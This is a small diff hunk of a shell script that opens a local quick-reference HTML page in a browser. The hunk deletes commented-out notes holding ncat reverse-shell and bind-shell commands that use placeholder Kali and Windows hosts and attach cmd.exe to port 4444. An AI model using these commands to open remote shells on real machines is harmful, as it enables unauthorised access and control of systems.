@@ -50,10 +50,3 @@ URL="file://$pwd/quickref.html"
 path=$(which xdg-open || which gnome-open || which open) && exec "$path" "$URL"
 echo "Can't find browser. Open $URL"
 
-#Rev
-#ncat -lnvp 4444 --allow [win ip] --ssl    # kali
-#ncat -nv [kali ip] 4444 -e cmd.exe --ssl
-
-#Bind
-#ncat -lnvp 4444 -e cmd.exe --allow [kali ip] --ssl      # win
-#ncat -nv [win ip] 4444 --ssl
